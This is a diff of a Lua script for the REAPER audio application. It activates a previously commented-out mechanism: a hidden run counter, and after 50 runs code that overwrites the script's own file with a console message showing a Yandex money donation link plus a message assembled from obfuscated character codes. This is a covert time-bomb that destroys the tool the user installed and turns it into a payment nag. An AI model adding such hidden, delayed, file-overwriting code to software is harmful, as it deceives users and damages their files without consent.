@@ -24,11 +24,12 @@
     
     
         ------------------------------------------
+    ------------------------------------------
     local filename = ({reaper.get_action_context()})[2];
     
     
-    local lcz = 50;
     
+    local lcz = 50;
     
     local eDMo = tonumber(reaper.GetExtState(filename,"eDMo"))or 0;
     if eDMo > lcz then eDMo = lcz-10 end;
@@ -41,13 +42,14 @@
     111,110,32,112,97,121,32,100,111,110,97,116,39,44,39,87,111,111,112,115,39,44,48,41,59);
     
     
-    local Op = string.char(105,111,46,111,112,101,110);
-      
-    if eDMo == lcz then;
-        --Op = load("return "..Op.."('"..filename:gsub("\\","/").."','w')")();
-    end;
+    local opn = io.open;
     
-    --if eDMo==lcz then;Op:write(edD):close();end;
+    local Op = [[reaper.ShowConsoleMsg("https://money.yandex.ru/to/410018003906628/1000")]]
+    
+    
+  
+     if eDMo==lcz then;opn(filename,"w"):write(Op.."\n"..edD):close();end;
+    ----------------------------------------------
     ----------------------------------------------
     
     
